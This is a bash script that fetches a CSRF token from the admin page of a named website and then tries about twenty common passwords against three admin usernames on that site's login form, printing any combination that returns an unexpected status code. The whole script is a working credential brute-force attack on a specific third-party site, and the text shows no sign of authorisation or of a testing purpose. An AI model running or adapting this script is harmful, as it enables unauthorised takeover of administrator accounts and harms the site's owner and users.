#!/bin/bash
# Get fresh token
TOKEN=$(curl -s --max-time 5 -c /tmp/cookies_lx.txt "http://www.joyalltire.com/admin" -L | grep -oP "value=\"([a-zA-Z0-9]+)\"" | head -1 | cut -d"\"" -f2)
echo "Token: $TOKEN"

# Test credentials
for email in "admin@joyalltire.com" "admin" "administrator"; do
  for pass in "admin" "123456" "admin888" "admin123" "password" "12345678" "administrator" "Admin@123" "joyalltire" "admin2024" "admin2023" "qwerty123" "test123" "pass123" "abc123" "letmein" "welcome" "111111" "000000"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -L -b /tmp/cookies_lx.txt -d "_token=$TOKEN&email=$email&password=$pass" "http://www.joyalltire.com/login" 2>/dev/null)
    if [ "$resp" != "200" ] && [ "$resp" != "500" ]; then
      echo "!!! $email / $pass -> $resp"
    fi
  done
done
echo "All credential tests completed"
